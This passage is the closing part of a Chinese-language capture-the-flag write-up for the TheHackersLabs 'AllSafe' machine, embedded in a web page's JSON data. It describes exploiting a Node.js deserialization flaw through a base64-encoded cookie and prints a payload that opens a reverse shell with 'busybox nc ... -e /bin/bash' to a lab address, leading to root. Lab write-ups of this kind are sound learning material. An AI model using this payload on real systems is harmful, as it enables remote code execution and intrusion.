成功连接，聊天还是用中文（\u003c/p\u003e\n\u003cp\u003e这里尝试一下 SQL 注入，SSTI 之类的，也没能找到什么\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image26.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e需要知道 3000 端口运行在什么程序上，查看一下抓的包\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image27.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为 \u003ccode\u003eSocket.IO\u003c/code\u003e 是 Node.js 的流行实时库，所以猜测它是 \u003ccode\u003eNode.js\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image28.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在查看进程时也能看到 root 运行了 nodejs\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot         \u003cspan class=\"hljs-number\"\u003e308\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e1.6\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1248480\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e67224\u003c/span\u003e ?       Ssl  06:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:01 node server.js \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还发现了这个 \u003ccode\u003eCookie\u003c/code\u003e 是仅仅通过 Base64 加密了而已，模拟了其他用户后也没什么卵用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image29.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看了一下老夜和国外老友的WP（\u003ca href=\"https://7r1umphk.github.io/post/thl_allsafe.html%EF%BC%89%EF%BC%88https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md%EF%BC%89%E6%89%8D%E7%9F%A5%E9%81%93%E8%BF%99%E9%87%8C%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"\u003ehttps://7r1umphk.github.io/post/thl_allsafe.html）（https://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.md）才知道这里有反序列化漏洞\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e一些文章：\u003ca href=\"https://cloud.tencent.com/developer/article/1374840\"\u003ehttps://cloud.tencent.com/developer/article/1374840\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003epayload：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e{\u003cspan class=\"hljs-string\"\u003e\"rce\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"_$$ND_FUNC$$_function(){require('child_process').exec('busybox nc 192.168.56.5 1234 -e /bin/bash', function(error,stdout,stderr){})}()\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行 \u003ccode\u003ebase64\u003c/code\u003e 编码，替换上去\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image30.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e来到控制台，输入如下命令，先断开套接字并重新连接，服务器就会重新反序列化\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esocket.close()\nsocket.connect()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e 即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image31.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e要耐心 耐心 耐心 耐心\u003c/p\u003e","title":"TheHackersLabs - AllSafe","date":"2025-10-21","updated":"2025-10-21","tags":["TheHackerLabs","Linux","LFI","FUZZ","PasswordSafe","Make","Nodejs反序列化"],"categories":"靶机","comments":true,"description":"AllSafe https://labs.thehackerslabs.com/machine/139 Recon PortScan 枚举 80 端口，域名是 allsafe.thl 目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的 主站中还有一个功能，可以提交网址，所以索性测试了 SSRF..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"TheHackersLabsAllSafe"},"buildId":"fZfIvGZ7IygHEm6klVvEz","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>